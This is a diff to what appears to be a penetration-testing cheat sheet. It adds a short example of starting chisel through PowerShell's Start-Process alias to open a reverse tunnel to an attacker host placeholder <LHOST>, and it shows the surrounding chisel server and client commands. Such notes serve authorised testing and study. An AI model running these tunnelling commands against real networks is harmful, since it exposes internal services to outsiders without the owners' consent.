@@ -286,6 +286,12 @@ $ ./chisel server -p 9002 -reverse -v
 $ ./chisel client <LHOST>:9002 R:3000:127.0.0.1:3000
 ```
 
+##### With PowerShell Start-Process (saps)
+
+```c
+PS C:\> saps 'C:\chisel.exe' 'client <LHOST>:9002 R:3000:127.0.0.1:3000'
+```
+
 #### Forwaord multiple Ports at once
 
 ```c
